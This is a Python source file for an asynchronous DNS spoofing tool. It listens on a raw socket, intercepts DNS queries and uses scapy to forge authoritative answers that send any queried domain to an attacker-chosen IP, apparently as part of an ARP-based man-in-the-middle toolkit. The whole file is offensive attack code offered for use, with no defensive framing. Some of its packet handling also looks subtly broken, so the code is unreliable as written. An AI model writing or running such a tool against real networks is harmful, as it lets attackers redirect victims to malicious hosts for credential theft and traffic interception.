import asyncio
import logging
import socket

logger = logging.getLogger(__name__)


class DNSSpoofer:
    """Intercepts DNS requests and replies with a spoofed IP address."""
    def __init__(self, spoof_ip: str, listen_ip: str = "0.0.0.0", dns_port: int = 53):
        """Initialise the DNS spoofer with the target spoof IP and listen address."""
        self.spoof_ip = spoof_ip
        self.listen_ip = listen_ip
        self.dns_port = dns_port
        self._running = False
        self._task: asyncio.Task | None = None
        self._sock: socket.socket | None = None

    async def start(self):
        """Start the DNS spoofing loop."""
        if self._running:
            return
        self._running = True
        self._task = asyncio.create_task(self._dns_loop())
        logger.info("DNS spoofer started on %s:%d -> %s", self.listen_ip, self.dns_port, self.spoof_ip)

    async def stop(self):
        """Stop the DNS spoofing loop and close the raw socket."""
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except asyncio.CancelledError:
                pass
            self._task = None
        if self._sock:
            self._sock.close()
            self._sock = None
        logger.info("DNS spoofer stopped")

    _scapy_initialized = False

    @staticmethod
    def _init_scapy():
        if not DNSSpoofer._scapy_initialized:
            from scapy.config import conf
            conf.verb = 0
            DNSSpoofer._scapy_initialized = True

    def _build_spoof_response(self, query_data: bytes, client_addr: tuple) -> bytes | None:
        """Construct a forged DNS response pointing the queried domain to the spoof IP."""
        self._init_scapy()
        from scapy.all import IP, UDP, DNS, DNSRR
        try:
            pkt = IP(query_data[20:])  # strip IP header if present
            if UDP not in pkt:
                return None
            dns = pkt[DNS]
            if not dns or dns.qr != 0:
                return None
            qname = dns.qd.qname.decode("utf-8", errors="replace").rstrip(".")
            if not qname:
                return None

            spoofed = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                      UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
                      DNS(
                          id=dns.id,
                          qr=1,
                          aa=1,
                          qd=dns.qd,
                          an=DNSRR(rrname=dns.qd.qname, ttl=60, rdata=self.spoof_ip),
                      )
            return bytes(spoofed)
        except Exception as e:
            logger.debug("DNS spoof build error: %s", e)
        return None

    async def _dns_loop(self):
        """Listen for raw DNS queries and respond with spoofed answers."""
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            self._sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            self._sock.bind((self.listen_ip, self.dns_port))
            self._sock.setblocking(False)

            loop = asyncio.get_event_loop()
            while self._running:
                try:
                    data, addr = await loop.sock_recvfrom(self._sock, 65535)
                    response = await asyncio.to_thread(self._build_spoof_response, data, addr)
                    if response:
                        await loop.sock_sendall(self._sock, response)
                except BlockingIOError:
                    await asyncio.sleep(0.01)
                except Exception as e:
                    logger.debug("DNS loop error: %s", e)
                    await asyncio.sleep(0.1)
        except PermissionError:
            logger.warning("DNS spoofing requires admin/root. Falling back to ARP-only.")
        except Exception as e:
            logger.error("DNS spoofer failed: %s", e)
        finally:
            if self._sock:
                self._sock.close()
                self._sock = None
